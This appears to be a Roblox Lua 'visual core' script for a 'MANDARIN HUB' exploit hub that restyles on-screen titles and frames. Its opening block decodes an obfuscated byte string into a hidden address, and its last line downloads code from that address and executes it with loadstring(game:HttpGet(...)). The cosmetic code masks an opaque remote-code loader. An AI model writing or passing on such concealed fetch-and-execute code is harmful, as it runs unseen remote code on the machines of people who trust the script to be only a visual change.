
--[[ STAGE 2: VISUAL CORE ]]
local wMQ7t3oWIQCSBt="\189\208\215\218\224\046\042\049\240\253\010\022\083\019\032\050\045\065\049\079\080\077\093\085\104\110\127\119\131\148\209\141\160\169\238\147\197\199\209\207\204\034\051\048\065\059\075\077\086\100\102\110\117\039\045\132\149\147\157\086\178\095\192\188\121\126\209\142\224\153\247\165\171\003\011\027\025\209\034\236\230\255\062"local fMg87ZNwt_F7NHUG3j5=66 local VJNeEY8B8S6HDGE4SW=109 local odFeE9mxOFUUkCVg9fv6Ki=0 local rW3suC3ltOVLDEpChupV8M=7 local pM74jTnWIYwU5STaxOz=31 local nAufnDzCn7cGGbNyaJRN=false local SenPoO1_l_iZRBxRugd=bit32 and bit32.bxor if not SenPoO1_l_iZRBxRugd then SenPoO1_l_iZRBxRugd=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local r_n4CCYBgLeoL_qr={}for hdEjdPyDTa3Z1e8WUypUgs=1,#wMQ7t3oWIQCSBt do local Oq_PGFVTghb80yEMnj=string.byte(wMQ7t3oWIQCSBt,hdEjdPyDTa3Z1e8WUypUgs)local e21Dv8CC4v2vr=(VJNeEY8B8S6HDGE4SW+(hdEjdPyDTa3Z1e8WUypUgs*rW3suC3ltOVLDEpChupV8M)+pM74jTnWIYwU5STaxOz)%256 if odFeE9mxOFUUkCVg9fv6Ki==0 then Oq_PGFVTghb80yEMnj=(Oq_PGFVTghb80yEMnj-e21Dv8CC4v2vr)%256 r_n4CCYBgLeoL_qr[hdEjdPyDTa3Z1e8WUypUgs]=string.char(SenPoO1_l_iZRBxRugd(Oq_PGFVTghb80yEMnj,fMg87ZNwt_F7NHUG3j5))else Oq_PGFVTghb80yEMnj=SenPoO1_l_iZRBxRugd(Oq_PGFVTghb80yEMnj,fMg87ZNwt_F7NHUG3j5)r_n4CCYBgLeoL_qr[hdEjdPyDTa3Z1e8WUypUgs]=string.char((Oq_PGFVTghb80yEMnj-e21Dv8CC4v2vr)%256)end end local k__ZLG8CXLfzOYP_q=table.concat(r_n4CCYBgLeoL_qr)if nAufnDzCn7cGGbNyaJRN then k__ZLG8CXLfzOYP_q=string.reverse(k__ZLG8CXLfzOYP_q)end local lbkaiX2CU7vDTe=k__ZLG8CXLfzOYP_q
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(lbkaiX2CU7vDTe))()
